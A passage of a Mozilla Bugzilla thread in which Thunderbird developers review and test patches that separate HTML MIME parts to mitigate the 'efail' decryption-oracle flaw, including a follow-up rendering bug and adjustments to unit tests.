Comment on [attachment 8976363](/attachment.cgi?id=8976363 "Sanitize quotes, v4 (for 52)") [[details]](/attachment.cgi?id=8976363&action=edit "Sanitize quotes, v4 (for 52)") [[diff]](/attachment.cgi?id=8976363&action=diff "Sanitize quotes, v4 (for 52)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976363)
Sanitize quotes, v4 (for 52)
I've moved the "sanitize quoted HTML" part to [bug 1462488](/show_bug.cgi?id=1462488 "RESOLVED WONTFIX - Sanitize HTML quotes before sending them to the composer when replying").
I still think that this should be part of the fix here, in one way or another. But a separate bug allows easier discussion.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15321639_22599)• 7 years ago |

[Attachment #8976363](/attachment.cgi?id=8976363&action=edit "Sanitize quotes, v4 (for 52)") -
Attachment is obsolete: true

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15321655_22599)• 7 years ago |

[Attachment #8976377](/attachment.cgi?id=8976377&action=edit "Sanitize quotes, v2 vs. v4 - Screenshots") -
Attachment is obsolete: true

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 127](/show_bug.cgi?id=1419417#c127)• 7 years ago |
|  | |

> It's still unclear why we can't kill mimeInlineTextHTMLClass.
Because it's the base class for 2 othe classes.
> I'm not familiar with (pseudo-)"classes" in MIME, as far as I know the code,
> it's a mess of passing function pointers around and has little to do with OO design or a C++ class hierarchy.
That a common first impression when somebody who knows C++ looks at libmime. If you understand it, it's actually brilliant. jwz wrote it, who is actually one of the founders of mozilla.org and was the tech lead in the beginning. C was a requirement for him, so C++ OO was out.
So, he wrote a completely OO system in pure C (!) for libmime. It actually has all OO properties of encypsulation, inheritance and polymorphy. And, although it's using function pointers (like all OO systems in C), it's actually type safe. That's better than the OO system of GTK+ (which Mozilla also uses, I might add), which is not type safe.
So, yes, the code looks all yucky to people who work in C++, but it's actually brilliant for C code. libmime is the misunderstood step child of Thunderbird. Please don't beat on the poor guy. He's been doing great work for us for many years, with few problems.
I might add that the real bug here is not actually coming from libmime. libmime does its part correctly here. The problem is in the frontend that is unable to put each MIME part in its own <iframe> as it should. The fix is in libmime, because it's just a workaround against failures in higher layers.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 128](/show_bug.cgi?id=1419417#c128)• 7 years ago |
|  | |

Oh, and it's actually the cleanest class hierarchy anywhere in Thunderbird :-). By far. And well documented, too, in mimei.h. Great reading.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 129](/show_bug.cgi?id=1419417#c129)• 7 years ago |
|  | |

Thanks for the explanation. Strangely enough I don't know a person who finds this brilliant. Most find it yucky, and fixing bugs wasn't much fun either over the years:
<https://hg.mozilla.org/comm-central/log/tip/mailnews/mime/src/mimemalt.cpp>
<https://hg.mozilla.org/comm-central/log/tip/mailnews/mime/src/mimemrel.cpp>
<https://hg.mozilla.org/comm-central/log/tip/mailnews/mime/src/mimemoz2.cpp>
<https://hg.mozilla.org/comm-central/log/tip/mailnews/mime/src/mimedrft.cpp>
Particularly nice was [bug 1016524](/show_bug.cgi?id=1016524 "VERIFIED FIXED - crash in MimeMultipart_parse_eof with multipart/related. kid->clazz accessed after free (double reference to child)"), [bug 1026989](/show_bug.cgi?id=1026989 "VERIFIED FIXED - Reply/\"Edit as new\"/\"Forward As->Attachment\"/Display message/Text Encoding of View, Options etc. : charset picked up from last attachment") and [bug 1251783](/show_bug.cgi?id=1251783 "RESOLVED FIXED - Forwarding of multipart message doesn't detect correct charset if multipart/related comes before multipart/alternative") :-(
Anyway, no one is opposing your patch, I even made it work on trunk and got you the test results we need. I'm also happy to organise some CSS.
===
I forgot to add Richard. Richard, see [comment #120](/show_bug.cgi?id=1419417#c120 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"). You need to change the patch a little and
#define TB\_61 1Flags: needinfo?(richard.marti)

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 130](/show_bug.cgi?id=1419417#c130)• 7 years ago |
|  | |

hm, [bug 1026989](/show_bug.cgi?id=1026989 "VERIFIED FIXED - Reply/\"Edit as new\"/\"Forward As->Attachment\"/Display message/Text Encoding of View, Options etc. : charset picked up from last attachment") "charset picked up from last attachment"... I wonder how many bugs steem from the fact that the frontend is unable to put each attachment in its own <iframe>. I bet this is not just a security feature, but also a correctness feature. CSS styles would also bleed between documents, and so on. Anyways, back to the patches...
Thanks that you helped me with the trunk adaption. I spent most of the night trying to get a trunk build and failed. It doesn't compile here. (Could be related to my system, as the tree is green.) So, sorry, I can't make trunk patches right now.
Thanks also for your help above with the tests. If indeed it's just adapting the expected result values, it should be trivial, yes.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 131](/show_bug.cgi?id=1419417#c131)• 7 years ago |
|  | |

(In reply to Ben Bucksch (:BenB) from [comment #130](/show_bug.cgi?id=1419417#c130 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> I wonder how
> many bugs steem from the fact that the frontend is unable to put each
> attachment in its own <iframe>. I bet this is not just a security feature,
> but also a correctness feature. CSS styles would also bleed between
> documents, and so on.
Yes, I agree 700%. See [bug 1297653](/show_bug.cgi?id=1297653 "NEW - html attachment with CSS breaks email rendering"), ancient [bug 31052](/show_bug.cgi?id=31052 "NEW - Display attachments inline: Contents & formatting of attached HTML file (background/CSS styles/position:absolute/dir=\"rtl\"...) leak into main HTML part or vice versa (wrong bgcolor/images/unclosed tags...: unreadable; multipart/mime, iframe,send web page)") and friends. You approach here to at least ensure syntactical correctness of each HTML part by parsing it separately is a good step in the right direction. Even without <iframe seamless> we should implement [bug 1297653](/show_bug.cgi?id=1297653 "NEW - html attachment with CSS breaks email rendering"), so at least HTML attachments don't bleed CSS into the body.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 132](/show_bug.cgi?id=1419417#c132)• 7 years ago |
|  | |

Ben, can you also please provide a test for the new MIME parser class. As per [comment #83](/show_bug.cgi?id=1419417#c83 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"), the C++ interface mozilla::dom::DOMParser::CreateWithoutGlobal() was created only for TB, it is not covered by any M-C tests and can break silently any time, see [bug 1454842 comment #4](/show_bug.cgi?id=1454842#c4 "RESOLVED FIXED - Port bug 1453869: Replace use of nsIDOMParser"). It was previously only used in "Windows Live Mail" import but it is now moving onto the main code path for HTML mail. So it would be good to write an M-C gtest to guarantee its functioning so M-C bustage doesn't hit us. At the very least we should write a C-C test that loads a HTML mail with "doubtful" content and then checks that the body is properly "corrected". We have many Xpcshell and Mozmill tests that load messages from file, process them and then check their body/content. So it wouldn't be hard to copy something together. The last one I did was in [bug 1456001](/show_bug.cgi?id=1456001 "RESOLVED FIXED - Write test for bug 1454257 - Treatment of folded headers in nsParseMailbox.cpp").

|  | [Richard Marti (:Paenglab)](/user_profile?user_id=282357) |  |
| --- | --- | --- |
| [Comment 133](/show_bug.cgi?id=1419417#c133)• 7 years ago |
|  | |

Attached image
[DOM.png](attachment.cgi?id=8977051)
— [Details](attachment.cgi?id=8977051&action=edit)

(In reply to Jorg K (GMT+2) (bustage-fix only, NI for urgent reviews) from [comment #120](/show_bug.cgi?id=1419417#c120 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> Created [attachment 8976711](/attachment.cgi?id=8976711 "horizontal lines.png") [[details]](/attachment.cgi?id=8976711&action=edit "horizontal lines.png")
> horizontal lines.png
>
> Richard, could you please load the e-mail in [attachment 8975458](/attachment.cgi?id=8975458 "A1-dec-pgp-smime-html-reply.eml") [[details]](/attachment.cgi?id=8975458&action=edit "A1-dec-pgp-smime-html-reply.eml")
> (which you encoded for me a little while ago) and apply patch "Separate MIME
> parts from each other, v4 (trunk and 52)". You should see what is shown in
> the picture. Sadly the horizontal lines have no margin/padding. Could you
> find our their class and add CSS to make the thing look a bit better.
The problem isn't the missing padding, it's applied. When you view the body as plain text the padding is correct. The problem is on HTML and Simple HTML: The message text isn't placed inside the moz-text-html class like in moz-text-plain. You can see the position of the closing </div> I marked with the red arrows.
Because of this, the moz-text-html class has a height of 0px and the following class is placed directly after the text.
When the text would be inside the class, all should be correct again.Flags: needinfo?(richard.marti)

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 134](/show_bug.cgi?id=1419417#c134)• 7 years ago |
|  | |

Can't test trunk, because it fails to compile for me. Filed [bug 1462794](/show_bug.cgi?id=1462794 "REOPENED - Build error: cannot convert ‘nsPresState*’ to ‘mozilla::PresState*’ caused by left-over nsILayoutHistoryState.h in source tree").Depends on: [1462794](/show_bug.cgi?id=1462794 "REOPENED - Build error: cannot convert ‘nsPresState*’ to ‘mozilla::PresState*’ caused by left-over nsILayoutHistoryState.h in source tree")

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 135](/show_bug.cgi?id=1419417#c135)• 7 years ago |
|  | |

> Ben, can you also please provide a test for the new MIME parser class.
Sorry, I have run of time for this bug. I spent most of the week on it (27 hours). Given that I'm not paid for it, I have to stop here.
> [the Gecko API we use] can break silently any time, see [bug 1454842 comment #4](/show_bug.cgi?id=1454842#c4 "RESOLVED FIXED - Port bug 1453869: Replace use of nsIDOMParser").
I see your point. A test would be useful. But if the parser API indeed goes away, we'd fail to build. If it was building, but not working properly, lots of existing tests would fail, because this is now the default handler for HTML mails. So, I would say we have sufficient coverage. But... if you want to add a specific test later on, that's fine. I don't think the time is now, though.
In any case, I myself cannot spend any more time on this. I'll be available for help, if you need my expertise. If you want to polish this patch further, please go ahead. I'd only request that you attribute the commit to me.
The patch works, with 52 and trunk. 3 days ago, I've spent an entire night on this, to get out as quickly as possible. Please land it and get it out now.
People are waiting for the fix, eyes are on us. Every day we delay the fix causes PR damage. Please speak to Ryan, he spent the whole last day putting fires out.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 136](/show_bug.cgi?id=1419417#c136)• 7 years ago |
|  | |

For the unit tests, I would recommend:
\* For existing tests, simply change the expected outcome to the current outcome.
\* For a specific test case for this bug, I would
\* take the emls attached here, and
\* use some existing test code that compares a test email with the libmime output. Then,
\* check that the actual output is the current output.
\* If you want to reduce spurious test failures, you could use an email with only the cut-off HTML part.
The expected output would contain the closing tags.
That should be reasonably quick to develop for somebody. But with all the build problems I had, on trunk and 60, and the review, I ran out of time. Sorry.

|  | [Wayne Mery (:wsmwk)](/user_profile?user_id=29811) |  |
| --- | --- | --- |
| [Comment 137](/show_bug.cgi?id=1419417#c137)• 7 years ago |
|  | |

To inform beyond those who I have PNed and are on drivers list, early this week we decided release 52.8.0 with the patches in hand to get them in the hands of users, and not wait on this last bug. That release is immenent. The other efail patches will be mentioned in the CVE linked from the release notes.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 138](/show_bug.cgi?id=1419417#c138)• 7 years ago |
|  | |

Ben, I guess we can organise for someone else to write the tests, but with your MIME knowledge, please look at Richard's [comment #133](/show_bug.cgi?id=1419417#c133 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"). Something isn't right with the HTML the new MIME class produces.
Thanks Richard, for the analysis. BTW, could you decode the message part?

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 139](/show_bug.cgi?id=1419417#c139)• 7 years ago |
|  | |

Ben, I looked at the DOM for "simple HTML". Sadly, that shows the same problem. The text content is not inside the <div>, thus proper CSS isn't applied. Richard, can you please confirm.
So "simple HTML" appears to have a bug which is now exposed on the code path for "original HTML". I'm sure you agree we can't accept the patch in it's current form. Could you please take a look how to fix this issue.Flags: needinfo?(richard.marti)

|  | [Richard Marti (:Paenglab)](/user_profile?user_id=282357) |  |
| --- | --- | --- |
| [Comment 140](/show_bug.cgi?id=1419417#c140)• 7 years ago |
|  | |

(In reply to Jorg K (GMT+2) (bustage-fix only, NI for urgent reviews) from [comment #139](/show_bug.cgi?id=1419417#c139 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> Ben, I looked at the DOM for "simple HTML". Sadly, that shows the same
> problem. The text content is not inside the <div>, thus proper CSS isn't
> applied. Richard, can you please confirm.
Yes, I wrote in [comment 133](/show_bug.cgi?id=1419417#c133 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"): "The problem is on HTML and Simple HTML". Both use the same class and the text is not inside the <div>.
BTW, what do you mean with: could you decode the message part?Flags: needinfo?(richard.marti)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 141](/show_bug.cgi?id=1419417#c141)• 7 years ago |
|  | |

(In reply to Richard Marti (:Paenglab) from [comment #140](/show_bug.cgi?id=1419417#c140 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> Yes, I wrote in [comment 133](/show_bug.cgi?id=1419417#c133 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"): "The problem is on HTML and Simple HTML". Both
> use the same class and the text is not inside the <div>.
Oops, missed that at 1:09 AM :-(
> BTW, what do you mean with: could you decode the message part?
Sorry, "decrypt". Did you see what you can see in [attachment 8976711](/attachment.cgi?id=8976711 "horizontal lines.png") [[details]](/attachment.cgi?id=8976711&action=edit "horizontal lines.png"): "Hallo Jörg, ...".

|  | [Richard Marti (:Paenglab)](/user_profile?user_id=282357) |  |
| --- | --- | --- |
| [Comment 142](/show_bug.cgi?id=1419417#c142)• 7 years ago |
|  | |

No, only the "Please answer to..." and two lines.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15448251_176914)• 7 years ago |

Depends on: [1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>")

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 143](/show_bug.cgi?id=1419417#c143)• 7 years ago |
|  | |

Richard wrote:
> The message text isn't placed inside the moz-text-html class
Ah, I see. Yes, that should be trivial to fix.
That code is already in the Normal HTML class. So, we need to either make sure to call the super function properly, I guess we simply don't do that, or we need to add corresponding code to the specialized classes.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 144](/show_bug.cgi?id=1419417#c144)• 7 years ago |
|  | |

Please fix it in [bug 1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>"), then use that fix on your new parser class. I promise a very quick review in [bug 1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>") and immediate landing if there are no test failures. The same goes for [bug 1462481](/show_bug.cgi?id=1462481 "RESOLVED FIXED - HTML Sanitizer class cleanup"). I trust I fixed your build problem also :-) (and all for free).

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 145](/show_bug.cgi?id=1419417#c145)• 7 years ago |
|  | |

Attached patch

[Separate MIME parts from each other, v4 (trunk only, with clean-up)](attachment.cgi?id=8979059&action=diff) (obsolete)
— [Details](attachment.cgi?id=8979059&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979059)

Since the little brother mimethsa.cpp just got a clean-up, I've done the same here (so we can stop the discussion and focus on the (severe) issue at hand). I've also removed the conditional compile code, since we won't land that on trunk. That will have to be restored for TB 60 and TB 52 but we cross that bridge when we get to it.
The test failures and the "text outside div" ([bug 1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>")) are blocking this.
[Attachment #8976349](/attachment.cgi?id=8976349&action=edit "Separate MIME parts from each other, v4 (trunk and 52)") -
Attachment is obsolete: true
[Attachment #8976349](/attachment.cgi?id=8976349&action=edit "Separate MIME parts from each other, v4 (trunk and 52)") -
Flags: review?(mkmelin+mozilla)
[Attachment #8979059](/attachment.cgi?id=8979059&action=edit "Separate MIME parts from each other, v4 (trunk only, with clean-up)") -
Flags: review?(mkmelin+mozilla)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 146](/show_bug.cgi?id=1419417#c146)• 7 years ago |
|  | |

Comment on [attachment 8979059](/attachment.cgi?id=8979059 "Separate MIME parts from each other, v4 (trunk only, with clean-up)") [[details]](/attachment.cgi?id=8979059&action=edit "Separate MIME parts from each other, v4 (trunk only, with clean-up)") [[diff]](/attachment.cgi?id=8979059&action=diff "Separate MIME parts from each other, v4 (trunk only, with clean-up)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979059)
Separate MIME parts from each other, v4 (trunk only, with clean-up)
r+ conditional on fixing [bug 1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>").
[Attachment #8979059](/attachment.cgi?id=8979059&action=edit "Separate MIME parts from each other, v4 (trunk only, with clean-up)") -
Flags: review+

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 147](/show_bug.cgi?id=1419417#c147)• 7 years ago |
|  | |

Attached patch

[1419417-fix-tests.patch](attachment.cgi?id=8979060&action=diff) (obsolete)
— [Details](attachment.cgi?id=8979060&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979060)

This fixes the tests.
Let's be sure and do another try:
<https://treeherder.mozilla.org/#/jobs?repo=try-comm-central&revision=5f2ef8a7ecf069d845d368ecf2f068ceb8fadd53>
[Attachment #8979060](/attachment.cgi?id=8979060&action=edit "1419417-fix-tests.patch") -
Flags: review?(mkmelin+mozilla)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 148](/show_bug.cgi?id=1419417#c148)• 7 years ago |
|  | |

Attached patch

[1419417-fix-tests.patch (v2)](attachment.cgi?id=8979061&action=diff) (obsolete)
— [Details](attachment.cgi?id=8979061&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979061)

Different platforms have different line endings, so this only worked on Windows. The new version should work everywhere.
<https://treeherder.mozilla.org/#/jobs?repo=try-comm-central&revision=1ce20ed3e47d9df8c5fbe68033bc628951b7b9f7>
[Attachment #8979060](/attachment.cgi?id=8979060&action=edit "1419417-fix-tests.patch") -
Attachment is obsolete: true
[Attachment #8979060](/attachment.cgi?id=8979060&action=edit "1419417-fix-tests.patch") -
Flags: review?(mkmelin+mozilla)
[Attachment #8979061](/attachment.cgi?id=8979061&action=edit "1419417-fix-tests.patch (v2)") -
Flags: review?(mkmelin+mozilla)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 149](/show_bug.cgi?id=1419417#c149)• 7 years ago |
|  | |

Attached patch

[1419417-remove-monkey-patch.patch](attachment.cgi?id=8979062&action=diff)
— [Details](attachment.cgi?id=8979062&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979062)

[Attachment #8979062](/attachment.cgi?id=8979062&action=edit "1419417-remove-monkey-patch.patch") -
Flags: review?(mkmelin+mozilla)

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 150](/show_bug.cgi?id=1419417#c150)• 7 years ago |
|  | |

Comment on [attachment 8979059](/attachment.cgi?id=8979059 "Separate MIME parts from each other, v4 (trunk only, with clean-up)") [[details]](/attachment.cgi?id=8979059&action=edit "Separate MIME parts from each other, v4 (trunk only, with clean-up)") [[diff]](/attachment.cgi?id=8979059&action=diff "Separate MIME parts from each other, v4 (trunk only, with clean-up)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979059)
Separate MIME parts from each other, v4 (trunk only, with clean-up)
Review of [attachment 8979059](/attachment.cgi?id=8979059 "Separate MIME parts from each other, v4 (trunk only, with clean-up)") [[details]](/attachment.cgi?id=8979059&action=edit "Separate MIME parts from each other, v4 (trunk only, with clean-up)") [[diff]](/attachment.cgi?id=8979059&action=diff "Separate MIME parts from each other, v4 (trunk only, with clean-up)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979059):
-----------------------------------------------------------------
r=mkmelin with the below adressed.
Sadly, this is a required step to prevent efail, but this is not fixing it for reply/fwd.
I thought earlier just converting to plain text would fix that, and it would mitigate for sure. But thinking about that some more, you could put enough newlines to push the content out of view then.
When using html, even with this patch, styles leak over between parts and can hide the content of the encrypted part so you would't see it when composing (either).
::: mailnews/mime/src/mimeTextHTMLParsed.cpp
@@ +71,5 @@
> + PR\_Free(content\_type);
> + if (charset)
> + {
> + nsAutoCString charsetline(
> + "\n<meta http-equiv=\"Context-Type\" content=\"text/html; charset=");
I believe this is wrong (and at this point no content type should be output). Haven't checked if it's just ignored or would cause problems.
The second one of the <meta http-equiv="Context-Type" content="text/html; charset=utf-8">, didn't use to appear. We just had two earlier :-p
When replying at least to an encrypted msg, I get this - notice, there's three http-equivs
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
</head>
<body text="#000000" bgcolor="#FFFFFF">
xyz<br>
<br>
<div class="moz-cite-prefix">On 4/19/18 11:27 PM, Magnus Melin
wrote:<br>
</div>
<blockquote type="cite"
cite="mid:79777860-fbab-4c85-9885-42936cadc71c@netti.fi">
<meta http-equiv="Context-Type" content="text/html; charset=utf-8">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
Heyheyhey!<br>
<br>
@@ +100,5 @@
> +
> + // We have to cache all lines and parse the whole document at once.
> + // There's a useful sounding function parseFromStream(), but it only allows XML
> + // mimetypes, not HTML. Methinks that's because the HTML soup parser
> + // needs the entire doc to make sense of the glibberish that people write.
gibberish
[Attachment #8979059](/attachment.cgi?id=8979059&action=edit "Separate MIME parts from each other, v4 (trunk only, with clean-up)") -
Flags: review?(mkmelin+mozilla) → review+

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15572834_101158)• 7 years ago |

[Attachment #8979062](/attachment.cgi?id=8979062&action=edit "1419417-remove-monkey-patch.patch") -
Flags: review?(mkmelin+mozilla) → review+

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 151](/show_bug.cgi?id=1419417#c151)• 7 years ago |
|  | |

Comment on [attachment 8979061](/attachment.cgi?id=8979061 "1419417-fix-tests.patch (v2)") [[details]](/attachment.cgi?id=8979061&action=edit "1419417-fix-tests.patch (v2)") [[diff]](/attachment.cgi?id=8979061&action=diff "1419417-fix-tests.patch (v2)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979061)
1419417-fix-tests.patch (v2)
Review of [attachment 8979061](/attachment.cgi?id=8979061 "1419417-fix-tests.patch (v2)") [[details]](/attachment.cgi?id=8979061&action=edit "1419417-fix-tests.patch (v2)") [[diff]](/attachment.cgi?id=8979061&action=diff "1419417-fix-tests.patch (v2)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979061):
-----------------------------------------------------------------
::: mailnews/mime/src/mimeTextHTMLParsed.cpp
@@ +71,5 @@
> PR\_Free(content\_type);
> if (charset)
> {
> nsAutoCString charsetline(
> + "\n<meta http-equiv=\"content-type\" content=\"text/html; charset=");
dunno what this change is about. But the whole outputting of http-equiv here looks wrong to me, pre previous comments

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 152](/show_bug.cgi?id=1419417#c152)• 7 years ago |
|  | |

Magnus, the current code is erroneously using "Context-Type", see:
<https://dxr.mozilla.org/comm-central/rev/9c9d0d5d6c8292e20b06cc895ed3b97eb55afe4f/mailnews/mime/src/mimethsa.cpp#82>
The new code, which is an adaption of mimethsa.cpp copied this error, also had it. I noticed when making the test work, so I corrected it.
Let me reshuffle the patches. Until the test patch has r+, I cannot land this. Also, [bug 1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>") is blocking the fix here since we would be using incorrect DOM for all HTML views, not just simple.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 153](/show_bug.cgi?id=1419417#c153)• 7 years ago |
|  | |

Attached patch

[Separate MIME parts from each other, v4b (trunk only, with clean-up)](attachment.cgi?id=8979120&action=diff)
— [Details](attachment.cgi?id=8979120&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979120)

Is this what you meant? I've fixed the "Context".
[Attachment #8979059](/attachment.cgi?id=8979059&action=edit "Separate MIME parts from each other, v4 (trunk only, with clean-up)") -
Attachment is obsolete: true
[Attachment #8979120](/attachment.cgi?id=8979120&action=edit "Separate MIME parts from each other, v4b (trunk only, with clean-up)") -
Flags: review?(mkmelin+mozilla)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 154](/show_bug.cgi?id=1419417#c154)• 7 years ago |
|  | |

See changes here:
<https://bugzilla.mozilla.org/attachment.cgi?oldid=8979059&action=interdiff&newid=8979120&headers=1>

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 155](/show_bug.cgi?id=1419417#c155)• 7 years ago |
|  | |

Attached patch

[1419417-fix-tests.patch (v2)](attachment.cgi?id=8979122&action=diff)
— [Details](attachment.cgi?id=8979122&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979122)

Same test fixed, but "repair" hunks moved elsewhere.
[Attachment #8979061](/attachment.cgi?id=8979061&action=edit "1419417-fix-tests.patch (v2)") -
Attachment is obsolete: true
[Attachment #8979061](/attachment.cgi?id=8979061&action=edit "1419417-fix-tests.patch (v2)") -
Flags: review?(mkmelin+mozilla)
[Attachment #8979122](/attachment.cgi?id=8979122&action=edit "1419417-fix-tests.patch (v2)") -
Flags: review?(mkmelin+mozilla)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 156](/show_bug.cgi?id=1419417#c156)• 7 years ago |
|  | |

Attached patch

[1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]](attachment.cgi?id=8979123&action=diff) (obsolete)
— [Details](attachment.cgi?id=8979123&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979123)

Here you go.
[Attachment #8979123](/attachment.cgi?id=8979123&action=edit "1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]") -
Flags: review?(mkmelin+mozilla)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 157](/show_bug.cgi?id=1419417#c157)• 7 years ago |
|  | |

Comment on [attachment 8979123](/attachment.cgi?id=8979123 "1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]") [[details]](/attachment.cgi?id=8979123&action=edit "1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]") [[diff]](/attachment.cgi?id=8979123&action=diff "1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979123)
1419417-fix-mimethsa.patch [landed in [bug 1462481 comment #11](/show_bug.cgi?id=1462481#c11 "RESOLVED FIXED - HTML Sanitizer class cleanup")]
To advance proceedings, I've landed this as part of [bug 1462481](/show_bug.cgi?id=1462481 "RESOLVED FIXED - HTML Sanitizer class cleanup"):
<https://hg.mozilla.org/comm-central/rev/1dd08f49b8dd52533738f6471621097c3638e5ab>
[Attachment #8979123](/attachment.cgi?id=8979123&action=edit "1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]") -
Flags: review?(mkmelin+mozilla) → review+

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15580418_176914)• 7 years ago |

[Attachment #8979123](/attachment.cgi?id=8979123&action=edit "1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]") -
Attachment description: 1419417-fix-mimethsa.patch → 1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 158](/show_bug.cgi?id=1419417#c158)• 7 years ago |
|  | |

> this is not fixing it for reply/fwd.
Magnus, could you please elaborate?
